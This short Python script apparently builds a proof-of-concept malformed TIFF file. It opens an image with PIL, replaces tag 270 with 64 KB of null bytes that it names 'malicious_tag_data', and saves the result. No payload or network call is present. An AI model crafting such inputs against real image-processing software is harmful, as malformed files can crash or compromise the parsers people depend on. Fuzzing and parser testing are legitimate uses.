from PIL import Image

try:
    img = Image.open("image.tif")
except FileNotFoundError:
    print("Error: image.tif not found. Please make sure the file exists.")
    exit()
except Exception as e:
    print(f"Error opening image: {e}")
    exit()

if 270 in img.tag:
    tag_data = img.tag[270]
else:
    print("Error: Tag 270 not found in image.")
    exit()

malicious_tag_data = b"\x00" * 0x10000

img.tag = img.tag.copy()
img.tag[270] = malicious_tag_data


try:
    img.save("output.tif")
except Exception as e:
    print(f"Error saving image: {e}")

